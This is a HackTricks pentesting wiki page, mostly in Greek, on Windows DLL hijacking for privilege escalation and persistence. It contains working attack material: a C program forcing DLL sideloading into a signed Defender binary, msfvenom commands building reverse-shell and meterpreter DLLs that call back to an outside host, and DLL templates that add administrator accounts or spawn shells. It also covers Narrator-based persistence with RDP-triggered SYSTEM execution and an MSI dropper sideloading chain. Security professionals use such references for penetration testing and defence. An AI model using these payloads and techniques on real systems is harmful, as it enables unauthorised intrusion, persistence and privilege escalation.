# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

Το DLL Hijacking περιλαμβάνει τη χειραγώγηση μιας αξιόπιστης εφαρμογής ώστε αυτή να φορτώσει ένα κακόβουλο DLL. Ο όρος καλύπτει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, για privilege escalation. Παρότι εδώ εστιάζουμε στην escalation, ο τρόπος hijacking παραμένει ο ίδιος ανεξαρτήτως στόχου.

### Συνηθισμένες Τεχνικές

Εφαρμόζονται διάφορες μέθοδοι για DLL hijacking, η καθεμία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνησίου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας **DLL Proxying** για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης που προηγείται της νόμιμης, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL που η εφαρμογή θα φορτώσει, πιστεύοντας ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το %PATH% ή αρχεία .exe.manifest / .exe.local για να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο στο φάκελο WinSxS — μέθοδος που συνδέεται συχνά με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν φάκελο που ελέγχεται από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, μοιάζοντας με τεχνικές Binary Proxy Execution.

## Εντοπισμός ελλειπόντων Dlls

Ο πιο συνηθισμένος τρόπος για να βρείτε ελλείποντα DLL σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, ρυθμίζοντας τα εξής 2 φίλτρα:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και να εμφανίσετε μόνο το **File System Activity**:

![](<../../../images/image (153).png>)

Αν αναζητάτε ελλείποντα DLL γενικά, αφήστε αυτό να τρέξει για μερικά δευτερόλεπτα.\
Αν ψάχνετε για ένα ελλείπον DLL μέσα σε ένα συγκεκριμένο εκτελέσιμο, θα πρέπει να ορίσετε ένα επιπλέον φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε και να σταματήσετε την καταγραφή των συμβάντων.

## Εκμετάλλευση Ελλειπόντων Dlls

Για να επιτύχουμε privilege escalation, η καλύτερη ευκαιρία είναι να μπορέσουμε να γράψουμε ένα DLL που μια διεργασία με προνόμια θα προσπαθήσει να φορτώσει σε κάποιο από τα μέρη όπου θα αναζητηθεί. Συνεπώς, μπορούμε είτε να γράψουμε ένα DLL σε έναν φάκελο όπου το DLL αναζητείται πριν από το φάκελο που βρίσκεται το αρχικό DLL (σπάνια περίπτωση), είτε να γράψουμε σε κάποιον φάκελο όπου το DLL θα αναζητηθεί και το αρχικό DLL δεν υπάρχει σε κανέναν φάκελο.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Οι εφαρμογές των Windows αναζητούν DLL ακολουθώντας ένα σύνολο προκαθορισμένων διαδρομών αναζήτησης, με συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα κακόβουλο DLL τοποθετηθεί στρατηγικά σε μία από αυτές τις διαδρομές, έτσι ώστε να φορτωθεί πριν το αυθεντικό DLL. Μια λύση για να το αποτρέψετε είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα απαιτούμενα DLL.

Μπορείτε να δείτε τη σειρά αναζήτησης των DLL σε 32-bit συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η προεπιλεγμένη σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν απενεργοποιηθεί, ο τρέχων φάκελος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την καταχώρηση μητρώου HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλεγμένη τιμή είναι ενεργοποιημένη).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινάει από τον φάκελο του εκτελέσιμου module που φορτώνει η LoadLibraryEx.

Τέλος, σημειώστε ότι ένα DLL μπορεί να φορτωθεί υποδεικνύοντας μια απόλυτη διαδρομή αντί μόνο το όνομα. Σε αυτή την περίπτωση, το DLL θα αναζητηθεί μόνο σε αυτή τη διαδρομή (αν το DLL έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως συνήθως — φορτωμένες με το όνομα).

Υπάρχουν και άλλοι τρόποι για να αλλάξει η σειρά αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε με προβλεψιμότητα τη διαδρομή αναζήτησης DLL μιας νεοδημιουργημένης διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τις native APIs του ntdll. Παρέχοντας εδώ έναν φάκελο που ελέγχεται από τον επιτιθέμενο, μια στοχευόμενη διεργασία που επιλύει ένα εισαγόμενο DLL με βάση το όνομα (χωρίς απόλυτη διαδρομή και χωρίς τη χρήση των safe loading flags) μπορεί να εξαναγκαστεί να φορτώσει ένα κακόβουλο DLL από αυτόν τον φάκελο.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα λειτουργικής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (εξάγοντας τις απαιτούμενες συναρτήσεις ή λειτουργώντας ως proxy προς το πραγματικό) στον κατάλογο DllPath σας.
- Εκκινήστε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll κατά όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει την εισαγωγή μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί στην πράξη να οδηγεί σε multi-stage sideloading αλυσίδες: ένας αρχικός launcher αποθέτει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable binary με ένα προσαρμοσμένο DllPath για να αναγκάσει τη φόρτωση του DLL του επιτιθέμενου από έναν staging directory.


#### Εξαιρέσεις στην σειρά αναζήτησης DLL από τα έγγραφα των Windows

Ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν ένα **DLL που μοιράζεται το όνομά του με ένα που έχει ήδη φορτωθεί στη μνήμη** εντοπιστεί, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντίθετα, πραγματοποιεί έλεγχο για ανακατεύθυνση και για manifest πριν προχωρήσει στην επιλογή του DLL που ήδη είναι στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοσή του του known DLL, μαζί με τυχόν dependent DLLs, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs περιέχει μια λίστα αυτών των known DLLs.
- Εάν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτά τα dependent DLLs πραγματοποιείται σαν να είχαν δηλωθεί μόνο με τα **module names**, ανεξάρτητα από το αν το αρχικό DLL προσδιορίστηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση δικαιωμάτων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει με **διαφορετικά δικαιώματα** (horizontal ή lateral movement), η οποία **δεν έχει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** σε οποιονδήποτε **φάκελο** όπου το **DLL** θα **αναζητηθεί**. Αυτή η τοποθεσία μπορεί να είναι ο φάκελος του εκτελέσιμου ή ένας φάκελος μέσα στο system path.

Ναι, οι προϋποθέσεις είναι δύσκολο να βρεθούν καθώς **κατά default είναι μάλλον περίεργο να βρεις ένα privileged executable στο οποίο λείπει ένα dll** και είναι ακόμη **πιο περίεργο να έχεις write permissions σε φάκελο του system path** (συνήθως δεν μπορείς). Αλλά, σε κακώς ρυθμισμένα περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να ελέγξετε το [UACME](https://github.com/hfiref0x/UACME) project. Ακόμα κι αν ο **κύριος στόχος του project είναι να παρακάμψει το UAC**, μπορεί να βρείτε εκεί ένα **PoC** για Dll hijaking για την έκδοση των Windows που χρησιμοποιείτε (πιθανώς απλώς αλλάζοντας τη διαδρομή του φακέλου όπου έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός εκτελέσιμου και τα exports μιας dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρη οδηγό για το πώς να **abuse Dll Hijacking to escalate privileges** όταν έχετε δικαιώματα εγγραφής σε έναν **System Path folder** δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για να εντοπίσετε αυτήν την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll_.

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτήν την μελέτη για dll hijacking επικεντρωμένη στο dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με μη απαραίτητες εξαγόμενες συναρτήσεις**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Βασικά, ένα **Dll proxy** είναι ένα Dll ικανό να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί** αλλά και να **εκτίθεται** και να **λειτουργεί** όπως αναμένεται, προωθώντας όλες τις κλήσεις στη πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε ουσιαστικά να **ορίσετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **παραγάγετε ένα proxified dll** ή να **ορίσετε το Dll** και να **παραγάγετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε έναν meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιούργησε έναν χρήστη (x86 — δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σας

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που μεταγλωττίζετε πρέπει να **export several functions** που πρόκειται να φορτωθούν από τη victim process. Αν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** αυτές και το **exploit will fail**.

<details>
<summary>Πρότυπο C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL παράδειγμα με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με είσοδο νήματος</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να probes ένα προβλέψιμο, ανά-γλώσσα localization DLL κατά την εκκίνηση που μπορεί να hijacked για arbitrary code execution και persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Φίλτρο: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης της παραπάνω διαδρομής.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Μια πρόχειρη hijack θα προκαλέσει ομιλία/επισήμανση του UI. Για να μείνετε ήσυχοι, κατά το attach απαριθμήστε τα threads του Narrator, ανοίξτε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και `SuspendThread` αυτό· συνεχίστε στο δικό σας thread. Δείτε το PoC για πλήρες code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το τοποθετημένο DLL. Στην secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσει ο Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε με RDP στον host, στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσετε τον Narrator; το DLL σας εκτελείται ως SYSTEM στην secure desktop.
- Η εκτέλεση σταματά όταν η RDP συνεδρία τερματιστεί—injecτ/μεταναστεύστε άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια built-in Accessibility Tool (AT) καταχώρηση registry (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε αυθαίρετο binary/DLL, να την εισαγάγετε και έπειτα να ορίσετε `configuration` στην ονομασία εκείνου του AT. Αυτό παρέχει proxy για αυθαίρετη εκτέλεση υπό το πλαίσιο του Accessibility.

Notes
- Η εγγραφή κάτω από `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν admin δικαιώματα.
- Όλη η λογική του payload μπορεί να ζει σε `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως κανονικός χρήστης, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε την προγραμματισμένη εργασία να εκτελεστεί στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν η εργασία εκτελείται, το κακόβουλο DLL τρέχει στη συνεδρία του διαχειριστή σε μεσαίο επίπεδο ακεραιότητας.
4. Χρησιμοποιήστε τυπικές UAC bypass τεχνικές για να αναβαθμίσετε τα προνόμια από μεσαίο επίπεδο ακεραιότητας σε SYSTEM.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό ένα αξιόπιστο, υπογεγραμμένο process.

Chain overview
- Ο χρήστης κατεβάζει MSI. Μια CustomAction τρέχει αθόρυβα κατά την GUI εγκατάσταση (π.χ., LaunchApplication ή μια VBScript action), ανασυγκροτώντας το επόμενο στάδιο από embedded resources.
- Ο dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο κατάλογο (παράδειγμα ζεύγος: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το υπογεγραμμένο EXE ξεκινά, το Windows DLL search order φορτώνει το wsc.dll από τον working directory πρώτο, εκτελώντας κώδικα του attacker υπό έναν signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Αναζητήστε εγγραφές που εκτελούν executables ή VBScript. Παράδειγμα ύποπτου μοτίβου: LaunchApplication που εκτελεί ένα embedded αρχείο στο παρασκήνιο.
- Στο Orca (Microsoft Orca.exe), επιθεωρήστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Embedded/split payloads in the MSI CAB:
- Διοικητική εξαγωγή: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ή χρησιμοποιήστε lessmsi: lessmsi x package.msi C:\out
- Αναζητήστε πολλαπλά μικρά τεμάχια που ενώνονται και αποκρυπτογραφούνται από μια VBScript CustomAction. Συνήθης ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος υπογεγραμμένος host (Avast). Η διαδικασία προσπαθεί να φορτώσει το wsc.dll με το όνομα από τον κατάλογό της.
- wsc.dll: attacker DLL. Αν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να είναι αρκετό; διαφορετικά, φτιάξτε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη ενώ τρέχετε το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για τις απαιτήσεις εξαγωγής, χρησιμοποιήστε ένα proxying framework (π.χ., DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Εάν ο host χρησιμοποιεί absolute paths ή safe loading flags (π.χ., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS και forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
